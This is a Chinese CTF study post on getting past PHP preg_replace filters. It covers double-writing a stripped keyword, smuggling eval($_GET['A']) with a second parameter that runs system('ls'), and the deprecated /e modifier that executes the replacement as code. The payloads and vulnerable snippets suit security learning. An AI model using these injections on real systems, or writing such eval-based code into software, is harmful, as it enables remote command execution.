---
title: preg_replace
date: 2024-07-12 20:50:38
categories:
- PHP
tags:
- 函数绕过
---

&emsp;&emsp;preg_replace 函数执行一个正则表达式的搜索和替换。相比于preg_match 函数它多了一个替换的功能（没错，说了一句废话）  
&emsp;&emsp;通常来说，它有三个参数，preg_repalce($pattern,$repalcement,$subject);-->搜索$subject中匹配$pattern的部分，并以$replacement进行替换。话不多说，看题目就懂了。  
注：str_replace也是一样的特性，区别是正则的规则匹配

### 双写绕过
```
if(isset($_GET["str"]))
{
    $str = preg_replace('/HYNUCTF/',"",$_GET['str']);
    if($str === "HYNUCTF")
    {
        echo $flag;
    }
    else
        die('菜，就多练');
}
```
&emsp;&emsp;既然HYNUCTF组合会变为空那么可以通过双写拼接进行绕过，原理跟sql注入的关键字绕过差不多。  
payload：HYNU<font color=red>HYNUCTF</font>CTF  
&emsp;&emsp;红色部分被替换成了空，那么剩下的就拼接成了是吧。

### eval创建新变量绕过
&emsp;&emsp;这是个很有用的地方，很多题型都适用这个，当遇到过滤了关键字符或者没有头绪的时候，可以使用这个方法进行创建一个新变量去执行它。  
&emsp;&emsp;例如
```
$str = preg_replace('/system/',"",$_GET['str']);
······
payload：  
?str=eval($_GET['A']);&A=system('ls');
```
&emsp;&emsp;这是利用eval执行system命令去寻找拥有flag的页面，后续同理我们可以使用GET和POST方法来进行绕过。

### 经典漏洞/e
&emsp;&emsp;preg_replace函数的特性，/e可执行模式，此为PHP专有参数，例如preg_replace函数。也就是说，它的$repalcement部分会被当做命令执行。  
```
<?php
if(isset($_GET['str']))
{
    echo preg_replace('/HYNUCTF/e',$_GET['str'],"XTWASYS");
}
```
&emsp;&emsp;此时传入?str=system("ls");就可执行此代码。
